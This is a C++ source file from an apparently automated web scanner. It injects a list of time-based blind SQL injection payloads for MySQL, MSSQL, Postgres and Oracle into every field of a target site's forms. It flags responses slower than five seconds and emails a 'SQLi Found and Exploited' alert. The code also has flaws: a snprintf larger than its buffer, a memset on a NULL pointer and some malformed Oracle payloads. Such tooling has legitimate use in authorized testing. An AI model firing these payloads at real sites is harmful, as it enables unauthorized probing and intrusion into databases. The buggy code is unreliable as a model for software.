/*
 * BP-WebExploitationRunBlindSQLiFormChecks.cc
 *
 *  Created on: Dec 13, 2011
 *      Author: root
 */

#include "../../../../include/BP-Main.h"


// checks an anchor for  blind sqli
P_BP_WEB_BLIND_SQLINJ_TEST_RESULT BP_WebAssessmentCheckFormForBlindSQLi(P_BP_WEB_ASSESSMENT assessment, P_BP_HTML_FORM_LIST form)
{

	if(!assessment || !form)
		return NULL;

	// ####################################################################
	// ########## Parameter Matrix ########################################
	// ####################################################################

	// Static Blind SQLi Test Strings.  Remember to propagate any changes made here to
	// the global array in BP-WebExploitationRunBlindSQLiAnchorChecks.cc.
	char *global_blind_sqli_time_based_test_strings_forms[] = {
			/*mysql delay tests*/
			" OR (SELECT SLEEP(10))--%20",
			" OR SLEEP(10)-- %20",
			" OR SLEEP(10) ",
			"1 OR SLEEP(10) ",
			" WHERE (SELECT SLEEP(10))--%20",
			"' or SLEEP(10)--%20 ",
			"\" or SLEEP(10)--%20 ",
			"' OR 1=(SELECT SLEEP(10)) OR '1'='",
			/*mssql delay tests*/
			"OR IF EXISTS(SELECT 1) WAITFOR DELAY '0:0:10'--",
			"; IF EXISTS(SELECT 1) WAITFOR DELAY '0:0:10'--",
			"'; IF EXISTS(SELECT 1) WAITFOR DELAY '0:0:10'--",
			"\"; IF EXISTS(SELECT 1) WAITFOR DELAY '0:0:10'--",
			/*postgres delay tests*/
			" OR (SELECT pg_sleep(10))--%20",
			" OR pg_sleep(10)-- %20",
			" OR pg_sleep(10) ",
			"1 OR pg_sleep(10) ",
			" WHERE (SELECT pg_sleep(10))--%20",
			"' or pg_sleep(10)--%20 ",
			"\" or pg_sleep(10)--%20 ",
			"' OR 1=(SELECT pg_sleep(10)) OR '1'='",
			/*oracle tests*/
			"1 OR (select count(*) from all_objects) AND (select count(*) from all_objects) AND (select count(*) from all_objects) AND (select count(*) from all_objects) AND (select count(*) from all_objects) else 1",
			"1' or 1 = OR (select count(*) from all_objects) AND (select count(*) from all_objects) AND (select count(*) from all_objects) AND (select count(*) from all_objects) AND (select count(*) from all_objects)else 1 end –",
			"1\" OR (select count(*) from all_objects) AND (select count(*) from all_objects) AND (select count(*) from all_objects) AND (select count(*) from all_objects) AND (select count(*) from all_objects)else 1 end –",
			NULL
	};

	// generate blind tests
	size_t n = 0;
	P_BP_WEB_BLIND_SQLINJ_TEST blind_tests = NULL;
	for(; global_blind_sqli_time_based_test_strings_forms[n]; n++)
	{

		// allocate space for tests
		blind_tests = (P_BP_WEB_BLIND_SQLINJ_TEST) bprealloc(blind_tests, sizeof(BP_WEB_BLIND_SQLINJ_TEST) * (n+2));

		// zero structs and truncate end test position
		memset((void *) &blind_tests[n], 0x00, sizeof(BP_WEB_BLIND_SQLINJ_TEST) * 2);

		// set actual tests
		blind_tests[n].testFront = global_blind_sqli_time_based_test_strings_forms[n];
		blind_tests[n].type = BP_WEB_BLINDSQLI_TYPE_TIME_BENCHMARK;

	}

	// display the blind sql injection test set
	BP_DisplayBlindSQLiTestSet(blind_tests);

	// This variable is used in the case that the assessment is
	// started with a base URL which contains a script name
	// eg. www.google.com/index.html in which case the appending
	// of any variables or test conditions would cause a problem.
	// In the if() statements below you can see how this variable
	// has the script name stripped out and the appending is done
	// properly to avoid problems.
	char *baseTestURL = NULL;

	// Local anchor and form vars used for request generation
	P_BP_HTML_ANCHOR_LIST anchors       = NULL;
	P_BP_HTML_FORM_LIST forms           = form;
	P_BP_HTML_FORM_LIST formsSavedFirst = NULL;

	// set anchor pointers
	anchors = assessment->pageExtraction->anchors;

	// general purpose iterators used for walking checks in the
	// loops below.
	size_t x = 0;
	size_t i = 0;

	// set in the anchor loop below dynamically (per loop)
	size_t anchorLen = 0;

	// input count based on number of forms
	size_t formInputCount = 0;
	size_t formLen = 0;

	// used for detecting form protocols
	BP_ANCHOR_PROTO formProto = BP_ANCHOR_PROTO_DEFAULT;

	// Browser string used for request randomizations (generated and bpfreed() per loop)
	char *browserStr = NULL;

	// set anchor and form tests
	char *anchorTest = NULL;

	// XSS test created on loop
	char *xssTest = NULL;

	// form test string
	char *formTest = NULL;

	// Form HTTP Get String
	char *formGetStr = NULL;

	// Temporary string used and bpfree'd below which takes a string
	// with ordinary spaces, and encodes them as %20s
	char *unicodeSpaceEncodeStr = NULL;

	// Result set pointers (used internally and stored in assessment)---------
	P_BP_WEB_XSS_TEST_RESULT xssResultSet = NULL;

	// --------------------------------------------------
	// Form Analysis

	// Target and Method
	P_BP_HTML_FORM_PROPERTY_LIST formActionInput = NULL;
	P_BP_HTML_FORM_PROPERTY_LIST formMethodInput = NULL;

	// form method,
	BP_HTML_FORM_METHOD formMethod = BP_HTML_FORM_METHOD_UNSET;

	// Retrieves the variable count from an anchor based
	// on the delimiter set used for parsing.
	formInputCount = HTMLGetFormVarCount(forms);
	// printf("\n Form input count is: %u", formInputCount);

	// if the anchor count is 0, we can skip to the next anchor
	// element.
	if (!formInputCount)
		return NULL;

	//==========================
	// printf("\n Running blindsqli form check");
	// walk xss checks in the assessment
	for (i = 0; ; i++)
	{

		if(!blind_tests[i].testFront)
			break;

		for (x = 0; x < formInputCount; x++)
		{

			// retrieve the form action property
			formActionInput = HTMLGetFormPropertyByNameI(forms->properties, (char *) "action");

			// The form must have an action property, if not, continue
			if (!formActionInput)
				continue;

			formMethodInput = HTMLGetFormPropertyByNameI(forms->properties, (char *) "method");

			// default form behavior if no method is found, is to use the HTTP GET
			// method.
			if (!formMethodInput)
			{
				formMethod = BP_HTML_FORM_METHOD_GET;
			}
			else
			{
				formMethod = HTMLGetFormMethodFromString(formMethodInput->content);
			}

			// %%%%%%%%%% BEGIN ANCHOR/RELATIVE ANCHOR COMPOSITING %%%%%%%

			// set base url + max lengths
			formLen = strnlen(assessment->baseAssessmentURL, 2048);

			// add test front, no check required due to initial check
			formLen += bpstrlen(blind_tests[i].testFront);

			// check test tail and add to sum
			if(blind_tests[i].testTail)
				formLen += bpstrlen(blind_tests[i].testTail);

			// plus max embedded length
			formLen += BP_MAX_EMBEDDED_ANCHOR_TEST_LENGTH;

			// substitute variable at position
			formTest = (char *) bprealloc(formTest, formLen);
			memset(formTest, 0x00, formLen);

			// Check anchor protocol onsite/offsite check.
			formProto = HTMLGetAnchorProtocol(formActionInput->content, formActionInput->cLen);

			// tmp string for onsite
			char * tmp_str = NULL;

			// run form checks
			if (formProto == BP_ANCHOR_PROTO_HTTP || formProto == BP_ANCHOR_PROTO_HTTPS)
			{
				snprintf(formTest, formLen + 5, "%s", formActionInput->content);
				if(formTest[bpstrlen(formTest)-1] != '/')
					formTest[bpstrlen(formTest)] = '/';

			}
			else
			{
				baseTestURL = BP_ParseURLToPath(assessment->baseAssessmentURL, 1);
				snprintf(formTest, formLen + 5, "%s%s", baseTestURL, formActionInput->content);
				// printf("\n Generated onsite formtest: %s", formTest);
			}

			// destroy tmp string if necessary
			if(tmp_str)
				bpfree(tmp_str);

			// destroy test url if set then nullify for loop
			if (baseTestURL)
			{
				bpfree(baseTestURL);
				baseTestURL = NULL;
			}

			// %%%%%%%%%% BEGIN XSS TESTS %%%%%%%%%%%%%%%%%%%%%%%%%%

			// Generates a form input string suitable for xss testing
			xssTest = BP_WebAssessmentGenerateBlindSQLiFormTestSet(&blind_tests[i], forms, assessment->pageExtraction->delims, NULL,x);

			// printf("\n Using blindsql string?: %s", xssTest);
			if (xssTest == NULL)
			{
				continue;
			}

			// run request against anchor
			unicodeSpaceEncodeStr = BP_GenUnicodeSpaceString(xssTest, bpstrlen(xssTest));

			// Depending on the form method, link up the variables
			switch (formMethod)
			{

				// create a get request
				case BP_HTML_FORM_METHOD_GET:

					// long story short, allocate space for a HTTP GET request based on args + base + start delim lengths (1024 bytes extra in case im a retard)
					formGetStr = (char *) bpcalloc(bpstrlen(formTest) + bpstrlen(unicodeSpaceEncodeStr) + bpstrlen(assessment->pageExtraction->delims->startDelimiter)+ 1024, 1);

					// place data in buffer
					snprintf(formGetStr, bpstrlen(formTest) + bpstrlen(unicodeSpaceEncodeStr) + bpstrlen(assessment->pageExtraction->delims->startDelimiter)+10,
							"%s%s%s", formTest, assessment->pageExtraction->delims->startDelimiter, unicodeSpaceEncodeStr);

					// printf("\n Form get string3: %s", formGetStr);
					break;

				// html form method post
				case BP_HTML_FORM_METHOD_POST:

					// if its a post set, we can add only the form test string (URL)
					formGetStr = (char *) bpcalloc(bpstrlen(formTest) + 1024, 1);
					snprintf(formGetStr, bpstrlen(formTest) + 1, "%s", formTest);
					// printf("\n Form get string2: %s", formGetStr);
					break;

				// default is GET (per http standard)
				default:

					// long story short, allocate space for a HTTP GET request based on args + base + start delim lengths (1024 bytes extra in case im a retard)
					formGetStr = (char *) bpcalloc(bpstrlen(formTest) + bpstrlen(unicodeSpaceEncodeStr) + bpstrlen(assessment->pageExtraction->delims->startDelimiter)
							+ 1024, 1);

					// place data in buffer
					snprintf(formGetStr, bpstrlen(formTest) + bpstrlen(unicodeSpaceEncodeStr) + bpstrlen(assessment->pageExtraction->delims->startDelimiter),
							"%s%s%s", formTest, assessment->pageExtraction->delims->startDelimiter, unicodeSpaceEncodeStr);
					// printf("\n Form get string1: %s", formGetStr);
					break;
			}

			// bpfree browser string on loop if set
			if (browserStr)
			{
				bpfree(browserStr);
				browserStr = NULL;
			}

			if (assessment->randomizeBrowserStrsBetweenRequests)
			{
				browserStr = BP_HTTPGetRandomUserAgentString(assessment->userAgentPool, assessment->userAgentCount);
				BP_HTTPUserAgent(assessment->session, browserStr);
			}

			// ##########################################
			// ######### HTTP Request Section ###########
			// ##########################################

			// exploit request set
			P_BP_WEB_EXPLOIT_REQUEST_SET ers = NULL;

			// create form ers (set post if necessary)
			if (formMethod == BP_HTML_FORM_METHOD_POST)
				ers = BP_GenWebExploitRequestSet(formGetStr, unicodeSpaceEncodeStr);
			else
				ers = BP_GenWebExploitRequestSet(formGetStr, NULL);

			// run the actual test, continue if not-possible
			if(BP_RunWebExploitRequestSet(assessment, ers, assessment->http_request_max_retries) != ERR_SUCCESS)
			{
				BP_DestroyWebExploitRequestSet(ers);
				continue;
			}

			// display the exploit request set
			BP_DisplayExploitRequestSet(ers);


			// check the request time to match a delay injection
			if(assessment->session->req_time_s > 5)
			{
				// increase the result counter
				assessment->bsqli_result_count++;
				assessment->bsqli_results = (P_BP_WEB_BLIND_SQLINJ_TEST_RESULT) bprealloc(assessment->bsqli_results, sizeof(BP_WEB_BLIND_SQLINJ_TEST_RESULT) * (assessment->bsqli_result_count+1) );

				// zero out new positions (current and truncating positions)
				memset(&assessment->bsqli_results[assessment->bsqli_result_count-1], 0x00, sizeof(BP_WEB_BLIND_SQLINJ_TEST_RESULT) * 2);

				// set the database identifiers in the class
				assessment->bsqli_results[assessment->bsqli_result_count-1].db_result_id = assessment->db_result_id;

				// now set the db request
				assessment->bsqli_results[assessment->bsqli_result_count-1].db_request_log_id = assessment->db_http_last_request_made_id;

				// set the http get string
				if(formGetStr)
					assessment->bsqli_results[assessment->bsqli_result_count-1].http_get = bpstrdup(formGetStr);
				if(unicodeSpaceEncodeStr)
					assessment->bsqli_results[assessment->bsqli_result_count-1].http_post = bpstrdup(unicodeSpaceEncodeStr);

				printf("\n [+] Blind SQLi found.  Storing in assessment for committal to db.");

				// the blind sqli detected type
				assessment->bsqli_results[assessment->bsqli_result_count-1].type = BP_WEB_BLINDSQLI_TYPE_TIME_BENCHMARK;

				// set the result time
				assessment->bsqli_results[assessment->bsqli_result_count-1].actual_request_time = assessment->session->req_time_s;


				// send email if required
				if(assessment->send_notification_email_on_confirmed_or_blind_sqli)
				{

					// set find strings
					char * find_strs[] = {
							"BASE_HREF",
							"HTTP_GET_DATA",
							"HTTP_POST_DATA",
							"HTTP_COOKIE_DATA",
							NULL,
					};

					// set replace strings
					char * replace_strs[] = {
							assessment->baseAssessmentURL,
							ers->get_str,
							ers->post_str,
							ers->cookie_str,
							NULL
					};

					if(!replace_strs[0])
						replace_strs[0] = "";
					if(!replace_strs[1])
						replace_strs[1] = "";
					if(!replace_strs[2])
						replace_strs[2] = "";
					if(!replace_strs[3])
						replace_strs[3] = "";

					char *email_send_str = BP_GenerateSubstitutedTemplate(assessment->email_confirmed_or_blind_sqli_template, find_strs, replace_strs);

				    // attempt to send new message
				    BP_SendEmailMessage(
					    		   assessment->email_smtp_username,
					    		   assessment->email_smtp_password,
					    		   assessment->email_smtp_server,
					               assessment->email_smtp_from,
					               assessment->notification_emails,
								   /* Message Body including Subject */
								   "Subject: SQLi Found and Exploited (time-delay):",
								   email_send_str
					);

				}

				break;

			}

			if(ers)
			{
				BP_DestroyWebExploitRequestSet(ers);
				ers = NULL;
			}

			// display the exploit request set
			BP_DisplayExploitRequestSet(ers);

			// --

			// if the browser string was not destroyed, destroy it here
			if (browserStr)
			{
				bpfree(browserStr);
				browserStr = NULL;
			}



			// zero out anchor test
			memset(anchorTest, 0x00, anchorLen);

			// Destroy the session page memory pointers before running
			// SQL injection checks.
			if (assessment->session->page->memPtr != NULL)
			{
				bpfree(assessment->session->page->memPtr);
				assessment->session->page->memPtr = NULL;
				assessment->session->page->size = 0;
			}

			// destroy xss test string
			if (xssTest)
			{
				bpfree(xssTest);
				xssTest = NULL;
			}

			// destroy unicode encoded string
			if (unicodeSpaceEncodeStr)
			{
				bpfree(unicodeSpaceEncodeStr);
				unicodeSpaceEncodeStr = NULL;
			}

			// destroy get string if set
			if (formGetStr)
			{
				bpfree(formGetStr);
				formGetStr = NULL;
			}

			// destroy form test if set
			if (formTest)
			{
				bpfree(formTest);
				formTest = NULL;
			}

		} // END ANCHOR XSS TESTS

	}

	return NULL;

}

